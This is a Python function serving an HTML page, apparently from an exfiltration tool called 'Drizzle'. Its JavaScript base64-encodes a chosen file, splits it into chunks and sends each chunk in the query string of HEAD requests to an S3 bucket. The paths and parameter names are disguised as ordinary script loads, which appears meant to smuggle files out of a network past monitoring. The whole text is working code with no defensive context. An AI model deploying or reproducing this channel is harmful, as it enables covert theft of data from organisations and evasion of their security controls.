def index():
    return """
<!DOCTYPE html>
<html lang="en-US">
<head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
</head>
<body>
    Split Size: <input name="file_split_bytes" id="file_split_bytes" value="2048"/><br />
    S3 Bucket: <input name="s3_bucket" id="s3_bucket" /><br />
    Session ID: <input name="session_id" id="session_id" /><br />
    File to Send: <input type="file" name="file" id="file" /><br /><br />
    <hr />
    <textarea id="status" name="status" rows="30" cols="100"></textarea>
    <script>
        var FILE_SPLIT_BYTES = 0
        var DRIZZLE_S3_BUCKET = ""
        var DRIZZLE_SESSION = ""

        function chunkString(str, length) {
            return str.match(new RegExp('.{1,' + length + '}', 'g'));
        }

        function send(url) {
            var http = new XMLHttpRequest();
            http.open('HEAD', url);
            http.send();
        }

        function build_url(endpoint) {
            return `https://s3.amazonaws.com/${DRIZZLE_S3_BUCKET}/${DRIZZLE_SESSION}/${endpoint}`;
        }

        function add_status(message) {
             document.getElementById('status').value += `${message}\n`;
        }

        function set_status(message) {
                document.getElementById('status').value += `${message}`;
            }

        document.getElementById('file').onchange = function () {

            FILE_SPLIT_BYTES = parseInt(document.getElementById('file_split_bytes').value)
            DRIZZLE_S3_BUCKET = document.getElementById('s3_bucket').value
            DRIZZLE_SESSION = document.getElementById('session_id').value
            set_status("")
            var file = this.files[0];

            var reader = new FileReader();
            reader.onload = function (progressEvent) {
                // remove data url declaration
                // https://developer.mozilla.org/en-US/docs/Web/API/FileReader/readAsDataURL
                const regex = /^data\:[\w\_\-\/\*]+\;base64\,/;
                b64_contents = this.result.replace(regex, '')

                if(DRIZZLE_S3_BUCKET=="") {
                    alert("S3 Bucket empty - FAIL.");
                    return
                }

                if(DRIZZLE_SESSION=="") {
                    alert("Session empty - FAIL.");
                    return
                }

                // make url safe
                b64_url_contents = b64_contents.replace(/[+/=]/g, match =>
                    ({ '+': '-', '/': '_', '=': '' }[match])
                )
                file_hash = CryptoJS.MD5(b64_url_contents);
                add_status(`File hash:  ${file_hash}.`)
                file_parts = chunkString(b64_url_contents, FILE_SPLIT_BYTES)
                file_parts_len = file_parts.length

                if (file_parts_len > 0) {
                    url = build_url("start.js").concat(`?x-request-length=${file_parts_len}&x-request-hash=${file_hash}`)
                    send(url)
                    part_number = 1
                    for(part=0; part < file_parts_len; part++) {
                        file_part=file_parts[part]
                        url = (build_url("session.js").concat(`?x-request-sequence=${part_number}&x-request-data=${file_part}`))
                        send(url)
                        add_status(`Sending ${part_number} of ${file_parts_len}.`)
                        part_number+=1
                    }
                }

            }
            reader.readAsDataURL(file);
        };
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        document.getElementById('s3_bucket').value = urlParams.get("s3_bucket")
        document.getElementById('session_id').value = urlParams.get("session_id")
    </script>

</body>

</html>
"""
